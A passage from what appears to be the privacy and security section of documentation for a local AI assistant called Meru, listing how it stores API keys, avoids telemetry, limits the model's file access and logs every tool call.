  does, such as `curl`. You chose it, and `meru log` shows every run.
- API keys sit in one file only you can read, never in config, and never pass
  through the model.
- No telemetry leaves your machine. Meru's timing data goes only to loopback, without
  your text unless you opt in. Meru sends no crash reports and never checks for
  updates.
- Your data lives in plain files and one SQLite file that you can back up or delete.
- The model reads your files only through search and the three file tools, and
  both stop at your `[index] folders` and the indexer's skip rules.
- `meru log` and the `tool_calls` table show every action Meru took outside itself.
- The desktop app loads nothing from the network: its page, fonts and libraries
  ship inside it, and it never checks for updates.
